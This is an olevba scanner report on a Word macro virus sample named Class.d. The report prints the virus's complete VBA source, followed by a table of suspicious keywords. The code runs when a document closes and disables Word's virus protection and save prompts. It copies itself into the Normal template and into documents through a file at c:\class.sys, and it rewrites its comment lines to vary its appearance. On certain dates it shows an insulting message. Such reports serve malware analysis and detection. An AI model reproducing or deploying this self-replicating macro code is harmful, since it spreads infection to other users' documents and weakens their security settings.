olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-2527a5dedbaa30ba1a9fc8cf6aea8ad88880f6b0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-2527a5dedbaa30ba1a9fc8cf6aea8ad88880f6b0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/23/01 9:24:08 PM00016625.DOC
On Error GoTo out
'Tester2/23/01 9:24:08 PM00016625.DOC
Options.VirusProtection = False
'Tester2/23/01 9:24:08 PM00016625.DOC
Options.SaveNormalPrompt = False
'Tester2/23/01 9:24:08 PM00016625.DOC
Options.ConfirmConversions = False
'Tester2/23/01 9:24:08 PM00016625.DOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 9:24:08 PM00016625.DOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 9:24:08 PM00016625.DOC
If nt > 70 And ad > 0 Then GoTo out
'Tester2/23/01 9:24:08 PM00016625.DOC
If nt < 70 Then
'Tester2/23/01 9:24:08 PM00016625.DOC
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/23/01 9:24:08 PM00016625.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tester2/23/01 9:24:08 PM00016625.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tester2/23/01 9:24:08 PM00016625.DOC
End If
'Tester2/23/01 9:24:08 PM00016625.DOC
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/23/01 9:24:08 PM00016625.DOC
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Tester2/23/01 9:24:08 PM00016625.DOC
host.codemodule.AddFromFile ("c:\class.sys")
'Tester2/23/01 9:24:08 PM00016625.DOC
With host.codemodule
'Tester2/23/01 9:24:08 PM00016625.DOC
    For x = 1 To 4
'Tester2/23/01 9:24:08 PM00016625.DOC
    .deletelines 1
'Tester2/23/01 9:24:08 PM00016625.DOC
    Next x
'Tester2/23/01 9:24:08 PM00016625.DOC
End With
'Tester2/23/01 9:24:08 PM00016625.DOC
If nt < 70 Then
'Tester2/23/01 9:24:08 PM00016625.DOC
    With host.codemodule
'Tester2/23/01 9:24:08 PM00016625.DOC
    .replaceline 1, "Sub AutoClose()"
'Tester2/23/01 9:24:08 PM00016625.DOC
    .replaceline 91, "Sub ToolsMacro()"
'Tester2/23/01 9:24:08 PM00016625.DOC
    For x = 70 To 81
'Tester2/23/01 9:24:08 PM00016625.DOC
        .deletelines 62
'Tester2/23/01 9:24:08 PM00016625.DOC
    Next x
'Tester2/23/01 9:24:08 PM00016625.DOC
    .replaceline 35, "    For x = 1 To 4"
'Tester2/23/01 9:24:08 PM00016625.DOC
    End With
'Tester2/23/01 9:24:08 PM00016625.DOC
End If
'Tester2/23/01 9:24:08 PM00016625.DOC
With host.codemodule
'Tester2/23/01 9:24:08 PM00016625.DOC
    For x = 2 To 104 Step 2
'Tester2/23/01 9:24:08 PM00016625.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 9:24:08 PM00016625.DOC
    Next x
'Tester2/23/01 9:24:08 PM00016625.DOC
End With
'Tester2/23/01 9:24:08 PM00016625.DOC
out:
'Tester2/23/01 9:24:08 PM00016625.DOC
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 9:24:08 PM00016625.DOC
End Sub
'Tester2/23/01 9:24:08 PM00016625.DOC
Sub ToolsMacro()
'Tester2/23/01 9:24:08 PM00016625.DOC
End Sub
'Tester2/23/01 9:24:08 PM00016625.DOC
Private Sub CheckBox1_Click()
'Tester2/23/01 9:24:08 PM00016625.DOC
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

